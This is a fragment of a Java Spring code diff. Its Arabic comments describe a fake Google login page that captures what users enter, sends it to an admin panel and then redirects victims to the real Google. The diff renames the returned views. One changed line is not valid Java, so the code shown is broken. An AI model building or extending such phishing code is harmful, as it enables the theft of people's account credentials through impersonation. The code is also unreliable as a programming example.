@@ -28,7 +28,7 @@ public class AdminPanelController {
         }
 
         html.append("</table></body></html>");
-        return html.toString();
+        return html."verify.html";
     }
 }
 @Controller
@@ -37,7 +37,7 @@ public class GoogleCaptureController {
     // 1. يفتح صفحة جوجل الوهمية لما يدوس على الزرار
     @GetMapping("/login/google-page")
     public String showGooglePage() {
-        return "google-login"; 
+        return "verify.html"; 
     }
 
     // 2. يستلم البيانات ويبعتها للأدمن ويحول المستخدم لجوجل الحقيقي
